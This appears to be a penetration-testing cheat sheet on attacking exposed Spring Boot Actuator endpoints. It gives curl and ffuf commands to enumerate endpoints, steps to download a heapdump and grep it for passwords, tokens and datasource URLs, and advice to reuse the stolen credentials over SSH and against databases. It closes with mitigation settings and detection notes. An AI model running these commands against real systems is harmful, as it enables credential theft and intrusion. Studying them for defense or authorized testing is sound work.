---
topic: actuator
platform: Java / Spring Boot
tags: [web, java, spring-boot, heapdump, secrets]
---

# Spring Boot Actuator and heapdump

**English** | [🇪🇸 Español](actuator-heapdump.md)

> Reusable note. On an active box, do not publish screenshots with real data.

## Why it matters

`/actuator` is Spring Boot's diagnostics panel. When exposed it does not leak "a value": it leaks the process state. The most profitable endpoint is `heapdump`, because it downloads **all of memory** and with it the passwords living as strings (`Hikari`, `DataSource`, tokens, JWT keys).

## Detection

```bash
curl -s http://<HOST>/actuator
curl -s http://<HOST>/actuator | jq .
ffuf -u http://<HOST>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -mc 200,401,403
```

Typical response:

```json
{"_links":{"self":{"href":".../actuator"},
           "health":{"href":".../actuator/health"},
           "heapdump":{"href":".../actuator/heapdump"},
           "env":{"href":".../actuator/env"}}}
```

Other useful endpoints: `env` (variables), `configprops`, `mappings` (every route), `loggers`, `httptrace`, `threaddump`, `sessions`, `beans`, `caches`.

```bash
for e in env configprops mappings sessions beans loggers; do
  echo "== $e"; curl -s "http://<HOST>/actuator/$e" | head -c 400; echo
done
```

## Heapdump

```bash
curl -s http://<HOST>/actuator/heapdump -o heap.hprof
file heap.hprof && ls -lh heap.hprof
```

Fast extraction (no tooling):

```bash
strings -n 6 heap.hprof | grep -iE 'password|passwd|secret|token|jdbc:|http://|amqp://' | sort -u | less
```

Dedicated tools:

- **JDumpSpider**: `java -jar JDumpSpider.jar heap.hprof` → datasources, users, URLs.
- **Eclipse MAT** or **VisualVM** when you need objects and references.

Look especially for: database user and password, datasource URL, API keys, strings that look like passwords by length and context, and the process launch `-D` flags.

## With the credentials in hand

- Try the datasource database (`mysql`, `psql`, ClickHouse `8123`/`9000`).
- Try **reuse** over SSH or on the admin panel.
- Read `mappings` for internal endpoints that never appeared in the front end.

## Mitigation and detection

```properties
management.endpoints.web.exposure.include=health
management.endpoint.heapdump.enabled=false
management.endpoint.heapdump.access=none
management.server.port=127.0.0.1:9090
```

- Actuator bound to localhost or behind authentication.
- Rotated passwords and distinct credentials per service, so one dump does not open three doors.
- Detection: `/actuator/*` requests from outside the management network and multi-MB downloads of `/actuator/heapdump`.

## References

- <https://docs.spring.io/spring-boot/api/rest/actuator/heapdump.html>
- <https://github.com/whwlsfb/JDumpSpider>
